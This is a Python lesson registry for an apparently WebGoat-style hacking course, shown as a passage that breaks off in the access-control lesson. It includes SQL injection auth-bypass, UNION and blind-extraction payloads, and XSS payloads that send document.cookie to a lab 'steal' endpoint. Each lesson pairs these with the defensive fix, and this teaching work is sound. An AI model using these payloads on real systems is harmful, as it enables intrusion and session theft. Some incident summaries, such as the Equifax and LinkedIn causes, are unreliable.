"""
Lesson registry. WebGoat-style: each stage has a Lesson (concept + how-to +
worked example with the answer visible) and a Challenge (different target,
student must apply the technique).
"""

LESSONS = [
    # ---------------------------------------------------------------------
    # 1. Browser Devtools Primer
    # ---------------------------------------------------------------------
    {
        "id":          "devtools",
        "title":       "Browser Devtools Primer",
        "topic":       "Tools",
        "difficulty":  "Beginner",
        "duration":    "~15 min",
        "icon":        "wrench",
        "description": "Learn the four browser-devtools panels every web hacker uses: View Source, Inspect Element, Console, and Network.",
        "why_it_matters": "Almost every web vulnerability you will find starts with reading what is already on your screen. Without devtools fluency, you cannot see what the server actually sent, what the page is really doing, or what data the browser is leaking back.",
        "background": [
            "Browsers do a lot of work invisibly — they parse HTML, run JavaScript, manage cookies, store data, and send requests. Devtools is your window into all of it. Press F12 to open the panels, Ctrl+U to view raw page source.",
            "Four panels matter most. Elements shows the live DOM (the in-memory page), letting you read or edit any attribute. Console is a JavaScript REPL inside the page. Network logs every request and response with full headers. Application stores cookies, localStorage, and sessionStorage.",
            "This lesson is a warm-up: each stage hides a flag in a place reachable only via the matching panel. None of these are real attacks — they teach the reflexes you'll use in every later lesson."
        ],
        "learning_outcomes": [
            "Open the View Source view and search HTML for hidden values.",
            "Use Inspect Element to read hidden form fields and DOM attributes.",
            "Run JavaScript expressions in the Console to read page state.",
            "Read response headers and request bodies in the Network tab.",
            "Recognize where the browser exposes data the visible UI does not."
        ],
        "vocabulary": [
            {"term": "DOM", "def": "the live, in-memory representation of the page; what you see in the Elements panel."},
            {"term": "View Source (Ctrl+U)", "def": "raw HTML the server sent, before JavaScript modified anything."},
            {"term": "Console", "def": "a JavaScript REPL with full access to the page's variables and DOM."},
            {"term": "Headers", "def": "metadata attached to every HTTP request and response (Content-Type, Set-Cookie, X-*…)."},
            {"term": "HTML comment", "def": "text inside <!-- … -->; ignored by the renderer but shipped to every visitor."}
        ],
        "incidents": [
            {"year": "2014", "name": "Snapchat API leak", "summary": "Researchers found undocumented API method names in minified JavaScript via the browser, then used them to dump 4.6M phone numbers."},
            {"year": "2017", "name": "Magento admin URL leaks", "summary": "Hidden form fields in customer-facing pages exposed admin endpoints to anyone who pressed F12 — found and reported at scale."}
        ],
        "prerequisites": [
            "A modern browser (Chrome, Edge, or Firefox).",
            "No coding required — every challenge is solved by reading or copy/paste.",
            "~15 minutes."
        ],
        "intro_endpoint":     "lesson_devtools_intro",
        "challenge_endpoint": "lesson_devtools_challenge",
        "complete_endpoint":  "lesson_devtools_complete",
        "stages": [
            {
                "n": 1,
                "title": "View Source (Ctrl+U)",
                "objective": "Find the flag hidden in an HTML comment that is not visible in the rendered page.",
                "learning_outcome": "After this stage you can pull data from any HTML comment using View Source.",
                "concept": "Browsers render HTML but ignore comments — text wrapped in <!-- like this -->. Developers sometimes leave secrets, TODOs, or hints in comments that ship to production. View Source lets you read the raw HTML the server sent, comments and all.",
                "how_to": [
                    "Press Ctrl+U (or Cmd+Option+U on macOS) to open the page source in a new tab.",
                    "Use Ctrl+F to search for the word 'FLAG' inside the source.",
                    "The text inside <!-- ... --> is the comment. Copy the value after the colon.",
                ],
                "worked_example": {
                    "description": "Inside the page below there is a demo comment: <!-- DEMO_FLAG_VS: warm-up -->. View source, find it, and the answer is 'warm-up'.",
                    "payload":     "warm-up",
                    "explanation": "View Source shows raw HTML. Comments are stripped from the rendered DOM but preserved in the source view, so developer notes and forgotten flags become visible.",
                },
                "hints": [
                    "Open the page in a new tab and press Ctrl+U.",
                    "Use Ctrl+F in the source view and search for 'FLAG_VS:'.",
                    "Copy the word that appears after the colon — that's the flag.",
                ],
            },
            {
                "n": 2,
                "title": "Inspect Element (F12)",
                "objective": "Find the value of a hidden form input that the page never displays.",
                "learning_outcome": "After this stage you can read hidden form fields and DOM attributes via Inspect Element.",
                "concept": "Hidden inputs (type=\"hidden\") are part of the form and submitted with it, but are invisible to the user. Inspect Element lets you walk the live DOM and read every attribute, including hidden values.",
                "how_to": [
                    "Right-click anywhere in the page and choose 'Inspect' (or press F12).",
                    "Open the Elements panel (the leftmost tab in most browsers).",
                    "Press Ctrl+F inside Elements and search for 'flag_input' — that's the input's name.",
                    "Read the value=\"...\" attribute on that <input>.",
                ],
                "worked_example": {
                    "description": "There's a demo input <input type=\"hidden\" name=\"demo_secret\" value=\"pillow\"> in the page. Inspect Element shows it; the answer is 'pillow'.",
                    "payload":     "pillow",
                    "explanation": "type=\"hidden\" controls visual rendering — it doesn't restrict access. The DOM holds the value verbatim and any user can read or modify it.",
                },
                "hints": [
                    "Press F12, click Elements, press Ctrl+F.",
                    "Search for: name=\"flag_input\"",
                    "The flag is the value attribute on that input.",
                ],
            },
            {
                "n": 3,
                "title": "Console (run JavaScript)",
                "objective": "Run a one-line JavaScript snippet to decode a base64 string the page exposes, and submit the decoded value.",
                "learning_outcome": "After this stage you can run JS in the Console to read page variables and decode base64.",
                "concept": "The Console is a live JavaScript REPL. You can call any function the page defines, read any variable, and run arbitrary JS — including built-ins like atob() (decode base64) and btoa() (encode base64).",
                "how_to": [
                    "Press F12 and switch to the Console tab.",
                    "Find the encoded string in the page (it's stored in a JS variable named window.flagEncoded).",
                    "Type:  atob(window.flagEncoded)  and press Enter.",
                    "The console prints the decoded flag.",
                ],
                "worked_example": {
                    "description": "Demo: run  atob('cm9ja2V0')  in the Console. It prints 'rocket'. Same trick works on the real encoded value the page exposes.",
                    "payload":     "rocket",
                    "explanation": "atob() decodes base64. The Console can access any window-scoped variable the page set, so client-side 'obfuscation' via base64 is trivially reversible.",
                },
                "hints": [
                    "Open the Console tab in F12.",
                    "Type:  window.flagEncoded   to see the base64 string.",
                    "Type:  atob(window.flagEncoded)   to decode it.",
                ],
            },
            {
                "n": 4,
                "title": "Network tab (response headers)",
                "objective": "Click a button on the page, find the resulting request in the Network tab, and read a flag from a custom response header.",
                "learning_outcome": "After this stage you can read response headers and request bodies in the Network tab.",
                "concept": "The Network panel logs every request the browser makes — XHR/fetch, images, scripts. Each entry shows request and response headers in full. Servers often return diagnostic data in custom headers (X-...) that the page never displays.",
                "how_to": [
                    "Press F12, switch to the Network tab.",
                    "Make sure recording is on (the red dot at top-left).",
                    "Click the 'Fetch real flag' button on the page.",
                    "A new entry appears (filename network-real). Click it.",
                    "Open the Headers tab → Response Headers section. Look for X-Flag.",
                ],
                "worked_example": {
                    "description": "Click 'Fetch demo' first — its response includes header X-Demo-Flag: bridge. The real button works the same way but uses a different header name.",
                    "payload":     "bridge",
                    "explanation": "Browsers expose request/response metadata in devtools. Even when the page UI hides a value, the underlying HTTP exchange is fully readable.",
                },
                "hints": [
                    "Open Network, click 'Fetch real flag'.",
                    "Click the new entry; open Response Headers.",
                    "Read the value of X-Flag.",
                ],
            },
        ],
    },

    # ---------------------------------------------------------------------
    # 2. Client-Side Trust
    # ---------------------------------------------------------------------
    {
        "id":          "client-side",
        "title":       "Client-Side Trust",
        "topic":       "Tampering",
        "difficulty":  "Beginner",
        "duration":    "~20 min",
        "icon":        "shield-off",
        "description": "Why you can never trust the browser: tamper with hidden fields, cookies, localStorage, and disabled buttons to bypass client-side controls.",
        "why_it_matters": "Every form, cookie, and JS variable in the browser belongs to the user — including malicious users. Treating any of them as authoritative is one of the most common production bugs, and the cause of countless real-world price-tampering and privilege-escalation incidents.",
        "background": [
            "Web apps split work between the client (browser) and the server. Anything stored or shown in the browser is fully under the user's control: they can read, modify, delete, replay, or forge it. The HTML, the cookies, the JS variables, even the disabled state of a button — all are client state, all are tampering surfaces.",
            "The common 'client trust' mistakes look harmless: a hidden form field used as authorization, a cookie that says role=admin without a signature, a secret value cached in localStorage, a button disabled in HTML to 'prevent' an action. None of these stop a determined user with F12 open.",
            "The fix is the same in every case: re-derive or re-validate the sensitive value on the server, using session state or signed tokens. The form post and the cookie are inputs to authorization, never authority themselves."
        ],
        "learning_outcomes": [
            "Edit hidden form fields with Inspect Element and resubmit.",
            "Modify cookies in the Application tab and observe server reactions.",
            "Decode and re-encode base64 JSON tokens in the Console.",
            "Bypass the disabled attribute on buttons.",
            "Articulate why client-side validation is a UX feature, not a security control."
        ],
        "vocabulary": [
            {"term": "Hidden input", "def": "an <input type=\"hidden\"> — submitted with the form, invisible in the rendered UI but fully readable in the DOM."},
            {"term": "Cookie", "def": "small key/value automatically attached to every request to the same origin."},
            {"term": "localStorage", "def": "per-origin client storage; persists across sessions, fully readable and writable by JS."},
            {"term": "Mass assignment", "def": "server bug where the model accepts arbitrary client-supplied keys (e.g. role)."},
            {"term": "SameSite", "def": "cookie attribute that limits cross-site sending; mitigates CSRF, doesn't authenticate."}
        ],
        "incidents": [
            {"year": "2018", "name": "Airline fare-class tampering", "summary": "A major airline let users edit their booking class via a hidden form field; anyone could 'upgrade' themselves to first."},
            {"year": "2019", "name": "Cart total in localStorage", "summary": "An e-commerce site cached the cart total client-side; users edited the value and checked out for $0 before the bug was caught."}
        ],
        "prerequisites": [
            "Browser Devtools Primer recommended.",
            "Comfortable with HTML form basics (input types, GET vs POST).",
            "~20 minutes."
        ],
        "intro_endpoint":     "lesson_clientside_intro",
        "challenge_endpoint": "lesson_clientside_challenge",
        "complete_endpoint":  "lesson_clientside_complete",
        "stages": [
            {
                "n": 1,
                "title": "Hidden price-field tampering",
                "objective": "A 'checkout' form sends a hidden price. Tamper it so the server sees a price ≤ $1.00 and accepts the purchase.",
                "learning_outcome": "After this stage you can tamper with hidden form values and resubmit forms.",
                "concept": "Hidden form fields live in HTML — the browser controls them, not the server. If the server trusts the price the client sends, anyone can lower it. The fix is to look up the real price on the server using the product id.",
                "how_to": [
                    "Open Inspect Element (F12 → Elements).",
                    "Find the form; locate <input type=\"hidden\" name=\"price\" value=\"999.99\">.",
                    "Double-click the value to edit it. Set it to 0.50 (or any number ≤ 1).",
                    "Click Buy. The server records the price you sent.",
                ],
                "worked_example": {
                    "description": "The demo product is a $1.00 sticker. Lower the price to $0.50 and the server accepts.",
                    "payload":     "0.50",
                    "explanation": "Hidden inputs are stored in the DOM. The DOM is in the user's browser. There is nothing 'hidden' about that — only the visual rendering is suppressed.",
                },
                "hints": [
                    "Inspect → Elements → find the <input name=\"price\">.",
                    "Edit the value attribute directly in the DOM.",
                    "Submit the form normally; the server reads what you sent.",
                ],
            },
            {
                "n": 2,
                "title": "Cookie tampering (Application tab)",
                "objective": "The page stores your role in a cookie called 'role'. Edit it to 'admin' and the server will return the admin flag.",
                "learning_outcome": "After this stage you can edit cookies in the Application tab and observe how the server reacts.",
                "concept": "Cookies are sent on every request, but they are stored in the browser — readable and writable by the user. Putting authorization data in a cookie without signing it lets any user impersonate any role.",
                "how_to": [
                    "F12 → Application tab (Storage in Firefox).",
                    "Expand Cookies → click the entry for this site.",
                    "Find the cookie named 'role'. Double-click its value.",
                    "Change 'guest' to 'admin' and press Enter.",
                    "Reload the page (or click 'Check role' on the page).",
                ],
                "worked_example": {
                    "description": "There is also a cookie called 'theme'. Change it from 'light' to 'dark' and the page banner switches to dark mode — proof the change took effect.",
                    "payload":     "dark",
                    "explanation": "Cookies are client-side storage that the browser sends back to the server. Without server-side signing or session lookup, the server has no way to detect tampering.",
                },
                "hints": [
                    "F12 → Application → Cookies.",
                    "Edit the 'role' cookie's value to 'admin'.",
                    "Reload, then click 'Check role' or refresh — server reads what you sent.",
                ],
            },
            {
                "n": 3,
                "title": "localStorage tampering",
                "objective": "The page stores your session as a base64-encoded JSON in localStorage. Decode it, flip is_admin from false to true, re-encode, store it, and submit.",
                "learning_outcome": "After this stage you can decode, modify, and re-encode base64 JSON stored in localStorage.",
                "concept": "localStorage is per-origin client-side storage. Anything stored there is visible and editable by the user. Encoding (base64) is not encryption — it just hides plain text from casual viewers.",
                "how_to": [
                    "F12 → Application → Local Storage → click the site.",
                    "Find the key 'session'. Copy its base64 value.",
                    "In the Console, run:  JSON.parse(atob(localStorage.session))   to see the decoded object.",
                    "Build a new object with is_admin=true:  btoa(JSON.stringify({user:'you', is_admin:true}))",
                    "Set the new value:  localStorage.session = '<paste-the-btoa-output>'",
                    "Click 'Submit session' on the page.",
                ],
                "worked_example": {
                    "description": "There is also a 'demo' key holding {\"hour\":\"night\"}. Flip 'night' to 'day' the same way; the page banner says 'Daytime mode' to confirm.",
                    "payload":     "day",
                    "explanation": "base64 is encoding, not security. Once you can read and write localStorage, any client-side 'session' is forgeable.",
                },
                "hints": [
                    "Console:  JSON.parse(atob(localStorage.session))   shows {user:'you', is_admin:false}.",
                    "Build new value:  btoa(JSON.stringify({user:'you', is_admin:true}))",
                    "localStorage.session = '<that-string>';   then click Submit session.",
                ],
            },
            {
                "n": 4,
                "title": "Bypass a disabled button",
                "objective": "A button on the page has the disabled attribute. Re-enable it (or submit the form anyway) and click it to grab the flag.",
                "learning_outcome": "After this stage you can bypass the disabled attribute on a button via Inspect or Console.",
                "concept": "The 'disabled' attribute prevents user clicks in the rendered UI, but the underlying form and its endpoint are still reachable. Any client-side gating must be enforced again on the server.",
                "how_to": [
                    "F12 → Elements → find <button id=\"claim\" disabled>Claim flag</button>.",
                    "Click the disabled attribute and delete it (or right-click → Edit attribute).",
                    "The button is now active. Click it.",
                    "Alternative: in the Console run  document.getElementById('claim').click()",
                ],
                "worked_example": {
                    "description": "There is a disabled 'Reset' button next to the real one. Re-enable it and click — you'll see a 'reset acknowledged' banner.",
                    "payload":     "reset",
                    "explanation": "disabled is a UI hint, not an authorization check. A real fix returns a 403 from the server when the user shouldn't perform the action.",
                },
                "hints": [
                    "Elements panel → click the button → delete the 'disabled' attribute.",
                    "Then click it normally.",
                    "Or in the Console:  document.getElementById('claim').click()",
                ],
            },
        ],
    },

    # ---------------------------------------------------------------------
    # 3. SQL Injection
    # ---------------------------------------------------------------------
    {
        "id":          "sql-injection",
        "title":       "SQL Injection",
        "topic":       "Injection",
        "difficulty":  "Intermediate",
        "duration":    "~25 min",
        "icon":        "database",
        "description": "Recover the admin API key across three stages: filter-bypass auth, UNION-based extraction, and blind boolean inference.",
        "why_it_matters": "SQL injection has been the #1 web vulnerability for two decades. One vulnerable form can dump a company's entire database — every email, password hash, and credit-card record — in seconds.",
        "background": [
            "Most web apps store data in a database (MySQL, Postgres, SQLite, …) and talk to it using SQL. SQL itself is a programming language — a query like SELECT * FROM users WHERE name = 'X' mixes structure (keywords) and data (values).",
            "When the server builds queries by concatenating strings — query = \"WHERE name = '\" + user_input + \"'\" — and the user input contains SQL syntax (a quote, a comment, a UNION), the meaning of the query changes. The attacker is now writing SQL alongside the developer.",
            "The proper fix is parameterized queries: pass `?` placeholders to the driver and let it bind input as data. Filtering keywords looks like a fix, but the SQL grammar has too many corners — every WAF eventually falls to a clever payload."
        ],
        "learning_outcomes": [
            "Recognize string-concatenated SQL in source code.",
            "Bypass naive keyword blacklists using mixed-case SQL.",
            "Use UNION SELECT to dump data from arbitrary tables.",
            "Extract data through blind boolean responses one character at a time.",
            "Tell parameterized queries apart from vulnerable ones at a glance."
        ],
        "vocabulary": [
            {"term": "Injection", "def": "supplying input that the receiver parses as code, not data."},
            {"term": "UNION", "def": "SQL operator that combines results from two SELECT statements; column counts must match."},
            {"term": "Comment (--)", "def": "the SQL line-comment marker; lets you cut off the rest of a query."},
            {"term": "Blind injection", "def": "exploiting a bug that returns no error or visible data, only a yes/no signal."},
            {"term": "Parameterized query", "def": "query with ? placeholders; input is bound as a value, never parsed as SQL."}
        ],
        "incidents": [
            {"year": "2017", "name": "Equifax breach", "summary": "Exposed 147M people's records. Among the failures was unparameterized queries in their dispute-resolution portal."},
            {"year": "2012", "name": "LinkedIn dump", "summary": "117M password hashes were extracted via SQL injection on an internal endpoint, then mass-cracked."}
        ],
        "prerequisites": [
            "Browser Devtools Primer recommended.",
            "Reading basic SELECT / WHERE / AND / OR queries.",
            "~25 minutes."
        ],
        "intro_endpoint":     "lesson_sqli_intro",
        "challenge_endpoint": "lesson_sqli_challenge",
        "complete_endpoint":  "lesson_sqli_complete",
        "stages": [
            {
                "n": 1,
                "title": "Auth bypass with filter",
                "objective": "Log in as user 'admin' against a login form that blacklists a few SQL keywords (case-sensitive).",
                "learning_outcome": "After this stage you can bypass naive keyword filters and force-login as any user.",
                "concept": "If user input is concatenated into a SQL string, attackers can change the meaning of the query by injecting their own SQL syntax. A naive 'sanitizer' that only rejects exact uppercase keywords is bypassed because SQL itself is case-insensitive — uPpEr/lower mixed forms are valid SQL but invisible to the filter.",
                "how_to": [
                    "Look at the blacklist printed on the page — it lists exact substrings the server rejects.",
                    "Write a payload that uses one of those keywords with mixed case (oR instead of OR).",
                    "Inject a clause that forces the WHERE to be true: a' oR '1'='1",
                    "Pick the username you want to log in as in front of the payload.",
                ],
                "worked_example": {
                    "description": "We'll log in as the 'guest' demo account first. Username  guest' oR '1'='1   with any password. The vulnerable query becomes:  WHERE username = 'guest' oR '1'='1' AND password = '...'  — and AND binds tighter, so it logs in as guest.",
                    "payload":     "guest' oR '1'='1",
                    "explanation": "AND has higher precedence than OR in SQL, so the condition becomes  (username='guest' AND password='...') OR ('1'='1')  which is always true. The first matching row is returned.",
                },
                "hints": [
                    "Look at the blacklist — it's case-sensitive on UNION / OR / SELECT.",
                    "Mixed case (oR, sELEct) sails right past a naive case-sensitive filter.",
                    "Try a username like:  admin' oR '1'='1   with any password.",
                ],
            },
            {
                "n": 2,
                "title": "UNION-based extraction",
                "objective": "The product search query is UNION-injectable. Use UNION SELECT to dump the production api_key from the secrets table and submit it.",
                "learning_outcome": "After this stage you can use UNION SELECT to extract data from a hidden table.",
                "concept": "UNION combines the results of two SELECT statements into one result set. If user input lands inside a SELECT and you can append your own UNION, you can pull data from any table the database user can read — provided the column count and types match.",
                "how_to": [
                    "Find the column count of the original query: send  ' UNION SELECT NULL,NULL --   then  NULL,NULL,NULL --  etc. The one that returns rows (no error) tells you the count.",
                    "Replace the NULLs with the data you want from the secrets table.",
                    "The UI shows two columns (name, price). Put api_key in the first slot so it's printed.",
                ],
                "worked_example": {
                    "description": "Run search:  ' UnIoN SeLeCt api_key, env FROM secrets --   The result table prints both the staging key (wg_test_aaaa1111) and the production key. Copy the production one.",
                    "payload":     "wg_test_aaaa1111",
                    "explanation": "The original query selects 2 columns. Our UNION matches that, so SQLite happily appends our extra rows. The 'name' column ends up showing whatever we put first — perfect for exfiltration.",
                },
                "hints": [
                    "First find how many columns the original SELECT returns — try UNION SELECT NULL,NULL with 1, 2, 3 NULLs.",
                    "Once 2 columns work, replace one with api_key.",
                    "Try:  ' UnIoN SeLeCt id, api_key FROM secrets --",
                ],
            },
            {
                "n": 3,
                "title": "Blind boolean SQLi",
                "objective": "The username-availability endpoint replies only 'available' or 'taken'. Extract admin's 16-character recovery token one character at a time.",
                "learning_outcome": "After this stage you can extract a string one character at a time from a yes/no endpoint.",
                "concept": "Even when a SQL injection has no visible output, a true/false response leaks one bit per request. By writing a payload that is true only when a guessed character matches, an attacker can extract entire strings character-by-character.",
                "how_to": [
                    "Write a payload that returns a row only if the Nth character of the token equals X:  admin' AND SUBSTR((SELECT token FROM tokens WHERE user='admin'),1,1)='Q' --",
                    "If the response is 'taken', the guess is correct. If 'available', wrong.",
                    "Loop the alphabet for each position from 1 to 16.",
                ],
                "worked_example": {
                    "description": "Try this on alice's known token (the page shows it).  alice' AND SUBSTR((SELECT token FROM tokens WHERE user='alice'),1,1)='i' --   returns 'taken' because the first char of alice's token is 'i'. Same trick on admin.",
                    "payload":     "irrelevant1234567",
                    "explanation": "SUBSTR(s, 1, 1) is the first character of s. The AND clause filters to a row only when that character equals our guess. SQLite's response is 'row found / no row' — exactly the boolean we need.",
                },
                "hints": [
                    "Send a username like:  admin' AND SUBSTR((SELECT token FROM tokens WHERE user='admin'),1,1)='Q' --",
                    "When the response says 'taken', your guessed character is correct.",
                    "Script it: loop characters 1..16, try each printable char, keep the one that says 'taken'.",
                ],
            },
        ],
    },

    # ---------------------------------------------------------------------
    # 4. Cross-Site Scripting
    # ---------------------------------------------------------------------
    {
        "id":          "xss",
        "title":       "Cross-Site Scripting",
        "topic":       "Injection",
        "difficulty":  "Intermediate",
        "duration":    "~25 min",
        "icon":        "code-2",
        "description": "Exfiltrate the admin's session through reflected, stored, and DOM XSS — each guarded by a different naive filter.",
        "why_it_matters": "XSS lets an attacker run their JavaScript inside someone else's browser session — stealing cookies, performing actions as that user, or rewriting the page to phish further. It is one of the most prevalent web bugs in shipping software today.",
        "background": [
            "Whenever a server takes user input and renders it back into HTML, there is an XSS risk. Three flavors exist: reflected (input echoed in the same response), stored (persisted and rendered to other users later), and DOM (the page's own JS reads attacker-controlled data and writes it to a sink like innerHTML).",
            "The browser's HTML parser doesn't care where text came from. If the rendered page contains <script> or any tag with an event handler (onerror, onload, …), the browser runs it as code with the same authority as the rest of the site — including its cookies and session.",
            "Safe rendering means encoding for the context: HTML body → entity-encode angle brackets, attribute → encode quotes, JS → JSON.stringify, URL → percent-encode. Templates like Jinja2 do this by default, and CSP can blanket-block inline scripts as defense in depth."
        ],
        "learning_outcomes": [
            "Identify the three XSS flavors (reflected, stored, DOM) by symptom.",
            "Bypass naive sanitizers that strip <script> or on*= attributes.",
            "Use iframe srcdoc to smuggle handlers past attribute filters.",
            "Recognize DOM XSS sinks (innerHTML, document.write, eval) and sources (location.hash, location.search).",
            "Explain why output encoding beats input filtering."
        ],
        "vocabulary": [
            {"term": "Reflected XSS", "def": "payload appears in the response to the same request that submitted it."},
            {"term": "Stored XSS", "def": "payload persisted server-side; fires for every viewer of the affected page."},
            {"term": "DOM XSS", "def": "payload acted on entirely client-side by the page's own JS."},
            {"term": "Event handler", "def": "an attribute like onerror/onload/onclick that runs JS when a DOM event fires."},
            {"term": "srcdoc", "def": "an iframe attribute whose value is rendered as a fresh, embedded HTML document."}
        ],
        "incidents": [
            {"year": "2018", "name": "Tweetdeck stored XSS", "summary": "A single tweet auto-RT'd itself across thousands of accounts within minutes via stored XSS in the official client."},
            {"year": "2014", "name": "Yahoo Mail DOM XSS", "summary": "A crafted email link triggered DOM XSS that could exfiltrate the recipient's contact list."}
        ],
        "prerequisites": [
            "Browser Devtools Primer recommended (you'll watch payloads execute via Console / Network).",
            "HTML and one-line JavaScript.",
            "~25 minutes."
        ],
        "intro_endpoint":     "lesson_xss_intro",
        "challenge_endpoint": "lesson_xss_challenge",
        "complete_endpoint":  "lesson_xss_complete",
        "stages": [
            {
                "n": 1,
                "title": "Reflected XSS, tag-strip filter",
                "objective": "Make the admin's browser issue a request to /lesson/xss/steal carrying their cookie.",
                "learning_outcome": "After this stage you can craft a reflected XSS payload that survives a <script>-strip filter.",
                "concept": "Reflected XSS happens when a server echoes user input into HTML without encoding it. If the input contains a <script> or any tag with an event handler, the browser executes it as code. Filters that only strip <script> miss the dozens of other ways HTML triggers JavaScript.",
                "how_to": [
                    "The server strips <script>...</script> blocks (case-insensitively).",
                    "Use a different element with an event handler the filter doesn't know about.",
                    "<img src=x onerror=...> — the image fails to load, onerror fires.",
                    "Inside the handler, call fetch('/lesson/xss/steal?c='+document.cookie).",
                ],
                "worked_example": {
                    "description": "Worked example uses an alert to prove the filter is bypassed:  <img src=x onerror=alert(1)>   The simulated admin renders that and an alert would fire (we just check the handler survived).",
                    "payload":     "<img src=x onerror=alert(1)>",
                    "explanation": "<script> is one of many ways to run JavaScript. Event handlers (onerror, onload, onclick, ...) on tags like img/svg/iframe are equally executable, and naive 'strip <script>' filters never see them.",
                },
                "hints": [
                    "Stripping <script> doesn't kill event handlers.",
                    "Try:  <img src=x onerror=\"fetch('/lesson/xss/steal?c='+document.cookie)\">",
                    "The simulated admin browser auto-runs your payload and carries cookie ADMIN_COOKIE=letmein-admin.",
                ],
            },
            {
                "n": 2,
                "title": "Stored XSS via comments",
                "objective": "Post a comment that, when the admin views the comment list, calls /lesson/xss/steal.",
                "learning_outcome": "After this stage you can smuggle a stored XSS payload past an on*= attribute filter.",
                "concept": "Stored XSS is reflected XSS that persists. Once injected, every visitor — including authenticated admins — runs the payload. The filter on this stage strips ANY on*= attribute, so you can't put onerror= directly. You need a tag whose execution context is its own children.",
                "how_to": [
                    "<iframe srcdoc=\"...\"> renders its srcdoc as a fresh HTML document. The on*= filter only sees the OUTER attributes; the INNER HTML inside srcdoc is encoded as entities, then decoded by the browser at render time.",
                    "Encode your <img onerror=...> as HTML entities (&lt; for <, &gt; for >).",
                    "When the iframe renders, the entities decode back to working HTML and onerror fires inside the iframe.",
                ],
                "worked_example": {
                    "description": "Demo payload that prints into the iframe:  <iframe srcdoc=\"&lt;img src=x onerror=parent.alert(1)&gt;\"></iframe>   The on*= filter doesn't see the inner img, the iframe renders it, alert fires.",
                    "payload":     "<iframe srcdoc=\"&lt;img src=x onerror=parent.alert(1)&gt;\"></iframe>",
                    "explanation": "Filters work on what they recognize. srcdoc lets the attacker hide the dangerous attribute behind one layer of HTML encoding — invisible to the regex, fully decoded by the browser.",
                },
                "hints": [
                    "Without inline handlers you need a tag whose content executes on its own.",
                    "<iframe srcdoc=\"&lt;img src=x onerror=fetch('/lesson/xss/steal'+'?c='+parent.document.cookie)&gt;\"></iframe> survives the on*= filter.",
                    "After posting, hit \"Have admin view comments\" to trigger the simulated render.",
                ],
            },
            {
                "n": 3,
                "title": "DOM XSS via location.hash",
                "objective": "Submit a URL whose #fragment, when innerHTML'd by the page's JS, makes the page call /lesson/xss/steal.",
                "learning_outcome": "After this stage you can trigger DOM XSS via location.hash and innerHTML.",
                "concept": "DOM-based XSS happens entirely client-side: a vulnerable JS sink (innerHTML, document.write, eval) consumes a user-controlled source (location.hash, location.search, postMessage). The server never sees the payload — but the user's browser executes it.",
                "how_to": [
                    "The page runs:  el.innerHTML = decodeURIComponent(location.hash.slice(1));",
                    "innerHTML refuses to execute <script> tags but happily runs event handlers on freshly-inserted elements.",
                    "Put an <img onerror=...> in the fragment, URL-encode special characters as needed.",
                ],
                "worked_example": {
                    "description": "Demo: open  /lesson/xss/dom#<img src=x onerror=document.title='hi'>   The title changes, proving the handler ran via innerHTML.",
                    "payload":     "/lesson/xss/dom#<img src=x onerror=document.title='hi'>",
                    "explanation": "innerHTML inserts new nodes. <script> nodes inserted this way are intentionally not executed by browsers — but onerror/onload on freshly-parsed elements fire normally. That's the gap DOM-XSS exploits.",
                },
                "hints": [
                    "The vulnerable JS does:  document.getElementById('greeting').innerHTML = decodeURIComponent(location.hash.slice(1))",
                    "innerHTML won't run <script>, but it WILL run image error handlers.",
                    "Submit a URL like  /lesson/xss/dom#<img src=x onerror=fetch('/lesson/xss/steal?c='+document.cookie)>",
                ],
            },
        ],
    },

    # ---------------------------------------------------------------------
    # 5. Broken Access Control
    # ---------------------------------------------------------------------
    {
        "id":          "access-control",
        "title":       "Broken Access Control",
        "topic":       "Access Control",
        "difficulty":  "Intermediate",
        "duration":    "~30 min",
        "icon":        "user-x",
        "description": "Exploit four access-control flaws: predictable IDs, encoded IDs, hidden-field tampering on a transfer form, and mass-assignment role escalation.",
        "why_it_matters": "Access-control bugs let users see or modify data they shouldn't. They are routinely the most damaging real-world bugs — leaked health records, drained accounts, mass account takeovers — because the application works perfectly except for forgetting to ask 'should this user be allowed to do this?'.",
        "background": [
            "Authentication answers 'who are you?' — handled at login. Authorization answers 'what are you allowed to do?' — and must be checked on every request, on every endpoint, against the specific resource being touched.",
            "Common failures: trusting an ID in the URL without verifying ownership (IDOR), trusting an obfuscated/encoded ID as if it were unguessable, trusting hidden form fields for sensitive parameters, and accepting any field a client posts in an 'update profile' handler (mass assignment).",
            "The fix is always server-side: derive the user's identity from the session, look up which records they may touch, and explicitly allowlist which fields they may write. URLs and forms are public; sessions and policies are not."
        ],
        "learning_outcomes": [
            "Spot endpoints that take an `id` parameter without checking ownership.",
            "Decode/encode common ID formats (base64, hex) and enumerate.",
            "Identify hidden form fields used for authorization data.",
            "Recognize mass-assignment patterns (e.g. update(form_dict)) in code.",
            "Articulate the difference between authentication and authorization."
        ],
        "vocabulary": [
            {"term": "IDOR", "def": "Insecure Direct Object Reference — one user accesses another user's record by ID."},
            {"term": "Authorization", "def": "checking what an authenticated user is allowed to do."},
            {"term": "Authn vs Authz", "def": "short for authentication vs authorization; commonly conflated."},
            {"term": "Mass assignment", "def": "server-side bug where the model accepts arbitrary client-supplied keys."},
            {"term": "Allowlist", "def": "explicit list of fields/values the server accepts; everything else is rejected."}
        ],
        "incidents": [
            {"year": "2019", "name": "Facebook photo-API IDOR", "summary": "A bug let an attacker download albums from any account by guessing IDs in a third-party-app token API."},
            {"year": "2021", "name": "Peloton profile API", "summary": "Any authenticated user could fetch any other user's profile and stats by changing user_id in the URL — millions of records exposed."}
        ],
        "prerequisites": [
            "Browser Devtools Primer recommended.",
            "Familiar with HTTP query parameters and form submission.",
            "~30 minutes."
        ],
        "intro_endpoint":     "lesson_idor_intro",
        "challenge_endpoint": "lesson_idor_challenge",
        "complete_endpoint":  "lesson_idor_complete",
        "stages": [
            {
                "n": 1,
                "title": "Predictable ID enumeration",
                "objective": "Open profile #3 (Charlie). The route accepts any profile id without checking who you are.",
                "learning_outcome": "After this stage you can identify and exploit IDOR via predictable URL IDs.",
                "concept": "IDOR (Insecure Direct Object Reference) means a server exposes an internal identifier in the URL and trusts whoever asks for it. Without an ownership check, any logged-in user can fetch any record by guessing a number.",
                "how_to": [
                    "The URL is /lesson/access-control/profile/<id>. Currently you're profile #1.",
                    "Change the number in the URL. Try 2, then 3.",
                    "Notice the server returns the data with no error.",
                ],
                "worked_example": {
                    "description": "The lesson lets you open profile #2 (Bob) freely as the worked example. That confirms the bug — but the challenge stage only completes when you open profile #3.",
                    "payload":     "2",
                    "explanation": "The handler does PROFILES.get(id) with no check that current_user.id == profile.owner_id. The fix is one line — the omission is the bug.",
                },
                "hints": [
                    "The server doesn't check ownership. Just change the ID in the URL.",
